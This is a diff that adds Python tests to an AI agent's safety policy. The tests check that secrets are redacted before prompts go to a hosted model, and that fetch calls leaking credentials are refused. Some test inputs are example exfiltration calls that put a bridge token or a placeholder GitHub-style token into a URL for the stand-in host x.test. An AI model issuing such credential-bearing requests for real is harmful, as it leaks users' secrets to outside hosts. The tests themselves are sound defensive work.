@@ -113,3 +113,88 @@ def test_an_mcp_tool_marked_read_only_may_run(tmp_vault):
     lookup_thing.metadata = {"readOnlyHint": True}  # how langchain-mcp-adapters carries a server's annotations
     run([lookup_thing], [call("lookup_thing", {"q": "a"}), AIMessage("ok")], UNATTENDED)
     assert ran == ["a"]
+
+
+# --- what leaves the machine --------------------------------------------------------------------------------------
+
+TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+
+
+class Spy(Scripted):
+    """A scripted model that remembers the text it was sent, and can pretend to be hosted."""
+
+    seen: list = []
+    model: str = "gemma4:e4b"
+
+    def _next(self):
+        return super()._next()
+
+    def _stream(self, messages, *a, **kw):
+        self.seen.append("\n".join(str(m.content) for m in messages))
+        yield from super()._stream(messages, *a, **kw)
+
+    def _generate(self, messages, *a, **kw):
+        self.seen.append("\n".join(str(m.content) for m in messages))
+        return super()._generate(messages, *a, **kw)
+
+
+def spy_run(model_name, policy, system_prompt="vault says: " + TOKEN):
+    model = Spy(messages=iter([AIMessage("done")]), seen=[], model=model_name)
+    agent = make_agent(model, [], system_prompt=system_prompt)
+    if policy is None:
+        agent.invoke({"messages": [HumanMessage("my token is " + TOKEN)]})
+    else:
+        with run_scope(policy, "schedule"):
+            agent.invoke({"messages": [HumanMessage("my token is " + TOKEN)]})
+    return "\n".join(model.seen)
+
+
+def test_an_unattended_run_to_a_hosted_model_is_redacted_including_the_system_prompt():
+    sent = spy_run("nemotron-3-ultra:cloud", UNATTENDED)
+    assert TOKEN not in sent and "[redacted]" in sent
+
+
+def test_an_unattended_run_to_a_local_model_is_not_changed():
+    assert TOKEN in spy_run("gemma4:e4b", UNATTENDED)
+
+
+def test_your_own_chat_with_a_hosted_model_is_not_changed():
+    assert TOKEN in spy_run("nemotron-3-ultra:cloud", None)
+
+
+def make_fetch():
+    ran = []
+
+    @tool
+    def fetch(url: str) -> str:
+        """Fetch a URL."""
+        ran.append(url)
+        return "page"
+
+    return ran, fetch
+
+
+def test_a_fetch_url_with_one_of_your_credentials_is_refused_everywhere(monkeypatch):
+    import hi.config as config
+
+    monkeypatch.setattr(config, "HOST_BRIDGE_TOKEN", "a-very-private-bridge-token")
+    ran, fetch = make_fetch()
+    for policy in (None, UNATTENDED):
+        run([fetch], [call("fetch", {"url": "https://x.test/?k=a-very-private-bridge-token"}), AIMessage("ok")], policy)
+    assert ran == []
+
+
+def test_a_token_shaped_url_is_refused_only_in_an_unattended_run(tmp_vault):
+    ran, fetch = make_fetch()
+    url = f"https://x.test/?token={TOKEN}"
+    run([fetch], [call("fetch", {"url": url}), AIMessage("ok")], None)
+    assert ran == [url]  # you may paste your own signed link
+    ran.clear()
+    run([fetch], [call("fetch", {"url": url}), AIMessage("ok")], UNATTENDED.with_allowed(["fetch"]))
+    assert ran == []
+
+
+def test_a_normal_fetch_is_untouched(tmp_vault):
+    ran, fetch = make_fetch()
+    run([fetch], [call("fetch", {"url": "https://docs.python.org/3/"}), AIMessage("ok")], UNATTENDED)
+    assert ran == ["https://docs.python.org/3/"]
